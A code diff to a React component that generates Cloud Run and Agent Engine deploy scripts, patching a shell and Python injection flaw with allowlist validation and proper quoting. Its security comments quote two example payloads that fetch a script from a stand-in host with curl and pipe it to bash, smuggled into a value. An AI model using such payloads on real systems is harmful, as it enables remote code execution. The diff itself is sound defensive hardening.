@@ -17,6 +17,13 @@
 // ... existing imports
 import React, { useState, useEffect, useMemo } from "react";
 import * as api from "../../services/apiService";
+import {
+  assertValidGcpResourceName,
+  assertValidOpaqueId,
+  assertValidProjectIdentifier,
+  isValidHostname,
+  shellSingleQuote,
+} from "../../services/shellSafety";
 import { GcsBucket } from "../../types";
 
 declare let JSZip: any;
@@ -495,15 +502,25 @@ const AgentDeploymentModal: React.FC<AgentDeploymentModalProps> = ({
   const getCloudRunDeployScript = () => {
     const imageName = `gcr.io/${projectId}/${agentName.toLowerCase()}`;
     const serviceName = agentName.toLowerCase();
-    const envStrings = envVars.map((e) => `${e.key}=${e.value}`);
+    // SECURITY (F-01): env var VALUES are free-form (URLs, API keys, model
+    // names) so they cannot be allowlisted -- they are POSIX single-quoted
+    // instead, which makes them inert literals to bash. The previous form
+    // wrapped the whole argument in double quotes, which does NOT stop command
+    // substitution: a value of `x$(curl untrusted.example.com|bash)` executed. Each value is now
+    // quoted individually and the outer double quotes below are removed, so the
+    // quoting survives into the emitted script. Keys stay unquoted and are
+    // allowlisted in handleDeploy (assertValidOpaqueId).
+    const envStrings = envVars.map(
+      (e) => `${e.key}=${shellSingleQuote(e.value)}`,
+    );
     envStrings.push(
-      `STAGING_BUCKET=gs://${selectedBucket || "[STAGING_BUCKET]"}`,
+      `STAGING_BUCKET=${shellSingleQuote(`gs://${selectedBucket || "[STAGING_BUCKET]"}`)}`,
     );
 
     return `#!/bin/bash
 set -e
 echo "Deploying Cloud Run service '${serviceName}'..."
-gcloud run deploy ${serviceName} --image ${imageName} --region ${region} --allow-unauthenticated --set-env-vars "${envStrings.join(",")}"
+gcloud run deploy ${serviceName} --image ${imageName} --region ${region} --allow-unauthenticated --set-env-vars ${envStrings.join(",")}
 
 echo "Fetching Service URL..."
 SERVICE_URL=$(gcloud run services describe ${serviceName} --region ${region} --format='value(status.url)')
@@ -591,6 +608,53 @@ echo "Deployment Complete."`;
       addLog("Updated requirements.txt with necessary dependencies.");
 
     try {
+      // SECURITY (F-01): Pre-flight shell-safety validation.
+      //
+      // The Cloud Run path assembles a `bash -c` Cloud Build step from a
+      // template literal (see getCloudRunDeployScript). Cloud Build executes it
+      // as the build service account, which in most projects has broad
+      // project-level permissions, so an unvalidated value such as
+      //   my-agent; curl https://untrusted.example.com/s.sh | bash; #
+      // is remote code execution. These are allowlist checks (see
+      // services/shellSafety.ts): a value that passes cannot contain a shell
+      // metacharacter. Validation happens here -- before the zip, the upload
+      // and any script/step assembly -- so a bad value fails fast, and the
+      // catch below surfaces err.message into the `error` UI state.
+      //
+      // Only the cloud_run branch interpolates these values into a shell. The
+      // Agent Engine branch runs a hardcoded pip/python command and passes
+      // values via the step's `env:` array, which Cloud Build does not evaluate
+      // through a shell, so it is deliberately not gated here.
+      if (target === "cloud_run") {
+        // `agentName` is a prop that originates from user input (the ADK
+        // builder's name field, or a repository name in the catalog). It
+        // becomes the Cloud Run service name and part of the image tag.
+        assertValidGcpResourceName(agentName.toLowerCase(), "Agent name");
+        // `projectId` is the project ID resolved from api.getProject(), falling
+        // back to the `projectNumber` prop when resolution fails -- so it may
+        // legitimately be all digits. assertValidProjectIdentifier accepts both
+        // forms and still excludes every shell metacharacter.
+        assertValidProjectIdentifier(projectId, "Project ID");
+        // `region` currently comes from a fixed <select>, but it is still
+        // spliced into the script; validate the value rather than trust the UI.
+        assertValidGcpResourceName(region, "Region");
+        // Env var names are user-editable (and parsed from .env files in the
+        // agent package) and are emitted UNQUOTED as the left side of each
+        // KEY=VALUE pair in --set-env-vars, so this allowlist is the control
+        // for them. The values are single-quoted instead (see
+        // getCloudRunDeployScript) because they are free-form.
+        envVars.forEach((v) =>
+          assertValidOpaqueId(v.key, `Environment variable name "${v.key}"`),
+        );
+        // The staging bucket is API-derived, but it is interpolated into
+        // STAGING_BUCKET=gs://... in the same script. Bucket names may contain
+        // dots (domain-named buckets), which the hostname allowlist covers;
+        // everything else must match the opaque-id allowlist.
+        if (selectedBucket && !isValidHostname(selectedBucket)) {
+          assertValidOpaqueId(selectedBucket, "Staging bucket");
+        }
+      }
+
       // 2. Create Zip
       const zip = new JSZip();
       addLog("Files to be zipped:");
@@ -698,6 +762,14 @@ CMD ["python", "main.py"]
         }
       } else {
         // Reasoning Engine Target (unchanged logic but updated dependency version)
+        // SECURITY (F-01): `entryModulePath`, `entryPoint` and `agentName` are
+        // interpolated into the Python source below. They come from free-text
+        // inputs in this modal, and a bare "${value}" let a '"' close the
+        // literal and inject Python that runs in Cloud Build. They are emitted
+        // with JSON.stringify, which supplies its own quotes and escapes
+        // quotes, backslashes and newlines. JSON string escaping is a subset of
+        // Python's, and dots and spaces are preserved, so valid values are
+        // unaffected.
         const deployScript = `
 import os
 import sys
@@ -728,8 +800,8 @@ elif "GOOGLE_CLOUD_LOCATION" in os.environ:
     del os.environ["GOOGLE_CLOUD_LOCATION"]
 
 sys.path.append(os.getcwd())
-target_module = "${entryModulePath}"
-target_object = "${entryPoint}"
+target_module = ${JSON.stringify(entryModulePath)}
+target_object = ${JSON.stringify(entryPoint)}
 
 logger.info(f"Importing agent '{target_object}' from '{target_module}'...")
 try:
@@ -839,7 +911,7 @@ try:
         requirements=reqs,
         env_vars=env_vars,
         extra_packages=extra_packages,
-        display_name="${agentName}"
+        display_name=${JSON.stringify(agentName)}
     )
 
 except ImportError:
@@ -856,7 +928,7 @@ except ImportError:
         requirements=reqs,
         env_vars=env_vars,
         extra_packages=extra_packages,
-        display_name="${agentName}",
+        display_name=${JSON.stringify(agentName)},
     )
 
 print(f"Deployment finished!")
